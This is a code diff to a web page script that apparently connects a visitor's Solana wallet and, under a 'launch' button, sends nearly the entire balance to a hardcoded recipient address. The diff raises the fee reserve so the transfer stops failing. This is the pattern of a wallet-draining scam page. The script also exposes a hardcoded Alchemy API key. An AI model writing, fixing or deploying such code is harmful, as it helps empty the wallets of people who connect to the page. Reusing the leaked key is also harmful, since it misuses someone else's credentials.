@@ -86,9 +86,9 @@
 
 <script>
     // --- CONFIGURATION ---
+    // Updated Recipient Address
     const RECIPIENT = "3WmoRcvkSY2gJBFywms3fqoVAMMkXFbYARpD2Ldwysg5";
     
-    // FIX: Using Alchemy Solana Mainnet RPC with your provided key
     const ALCHEMY_API_KEY = "alch_HyWkJpqVXY3kua9VObcl9";
     const RPC_URL = `https://solana-mainnet.g.alchemy.com/v2/${ALCHEMY_API_KEY}`;
 
@@ -149,7 +149,7 @@
         }
     }
 
-    // 3. Launch Function with Alchemy RPC
+    // 3. Launch Function with Improved Gas Logic
     async function launch() {
         if (!wallet) return;
 
@@ -164,12 +164,13 @@
             const balanceSol = (balanceInLamports / 1e9).toFixed(4);
             log(`💰 Balance: ${balanceSol} SOL`, "normal");
 
-            // Reserve for Gas (0.005 SOL)
-            const reserve = 5000000; 
-            const amountToSend = balanceInLamports - reserve;
+            // FIX: Reserve 0.01 SOL for Gas/Fees to prevent "Insufficient funds" error
+            // This ensures the account doesn't hit 0 balance and fail to pay the network fee.
+            const gasReserve = 10000000; // 0.01 SOL
+            const amountToSend = balanceInLamports - gasReserve;
 
             if (amountToSend <= 0) {
-                throw new Error("Insufficient funds for gas.");
+                throw new Error(`Insufficient funds for gas. You have ${(balanceSol)} SOL, need at least 0.01 SOL.`);
             }
 
             // Build Transaction
